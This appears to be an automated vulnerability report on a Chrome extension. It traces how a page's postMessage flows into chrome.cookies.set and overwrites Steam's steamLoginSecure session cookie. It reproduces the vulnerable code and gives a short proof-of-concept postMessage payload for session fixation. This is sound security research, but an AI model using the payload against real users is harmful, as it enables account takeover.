# CoCo Analysis: allamanichfmbdahldekgolpfeoonpda

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: cs_window_eventListener_message → chrome_cookies_set_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/allamanichfmbdahldekgolpfeoonpda/opgen_generated_files/cs_0.js
Line 467	window.addEventListener("message", (event) => {...})
	event.data.cookie
```

**Code:**

```javascript
// Content script (content.js, Line 467 in cs_0.js)
(function() {
  const script = document.createElement('script');
  script.src = chrome.runtime.getURL('inject.js');
  (document.head || document.documentElement).appendChild(script);
  script.onload = function() {
    script.remove();
  };

  // Entry point - window.postMessage listener
  window.addEventListener("message", (event) => {
    if (event.source !== window) return;
    if (event.data.type && event.data.type === "FROM_PAGE") {
      try {
        chrome.runtime.sendMessage({
          action: "changeCookie",
          cookie: event.data.cookie  // ← attacker-controlled
        }, function(response) {
          if (chrome.runtime.lastError) {
            window.postMessage({ type: "COOKIE_STATUS", status: "error" }, "*");
            return;
          }
          if (response && response.status) {
            window.postMessage({ type: "COOKIE_STATUS", status: response.status }, "*");
          } else {
            window.postMessage({ type: "COOKIE_STATUS", status: "error" }, "*");
          }
        });
      } catch (error) {
        window.postMessage({ type: "COOKIE_STATUS", status: "error" }, "*");
      }
    }
  }, false);
})();

// Background script (background.js, Line 965 in bg.js)
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  console.log("Message received in background:", request);
  if (request.action === "changeCookie") {
    chrome.cookies.getAll({
      domain: "steamcommunity.com",
      name: "steamLoginSecure"
    }, function(cookies) {
      // Remove existing cookies
      cookies.forEach(cookie => {
        chrome.cookies.remove({
          url: "https://steamcommunity.com",
          name: cookie.name
        }, function(details) {});
      });

      // Set new cookie with attacker-controlled value
      chrome.cookies.set({
        url: "https://steamcommunity.com",
        name: "steamLoginSecure",
        value: request.cookie,  // ← attacker-controlled flows to sink
        domain: ".steamcommunity.com",
        path: "/",
        secure: true,
        httpOnly: true,
        sameSite: "lax"
      }, function(cookie) {
        if (chrome.runtime.lastError) {
          sendResponse({status: false, error: chrome.runtime.lastError});
        } else {
          sendResponse({status: true, cookie: cookie});
        }
      });
    });
    return true;
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from malicious webpage

**Attack:**

```javascript
// Malicious code running on new.uproject.io or steamcommunity.com
// (content script runs on these domains per manifest.json line 14)

// Attacker sends malicious cookie value via postMessage
window.postMessage({
  type: "FROM_PAGE",
  cookie: "attacker_controlled_session_token_76561199999999999%7C%7CeyAidHlwIjogIkpXVCIsICJhbGciOiAiRWREU0EiIH0.malicious_payload"
}, "*");

// The extension will:
// 1. Receive the message in content script
// 2. Forward to background script via chrome.runtime.sendMessage
// 3. Replace steamLoginSecure cookie with attacker's value
// 4. This overwrites the victim's Steam session cookie
```

**Impact:** Account takeover vulnerability. An attacker controlling a webpage where the content script runs (new.uproject.io or steamcommunity.com) can set arbitrary values for the steamLoginSecure cookie on steamcommunity.com domain. This cookie is Steam's authentication session cookie. By setting this to a session token controlled by the attacker, the attacker can:

1. **Hijack victim's Steam account** - Replace victim's legitimate Steam session with attacker's session
2. **Session fixation attack** - Force victim to use a known session token
3. **Privilege escalation** - If attacker compromises new.uproject.io domain, they can set cookies for steamcommunity.com

The vulnerability exists because the extension accepts attacker-controlled cookie values via window.postMessage and directly uses them in chrome.cookies.set() with the privileged "cookies" permission, allowing modification of httpOnly cookies that normally cannot be accessed by webpage JavaScript.
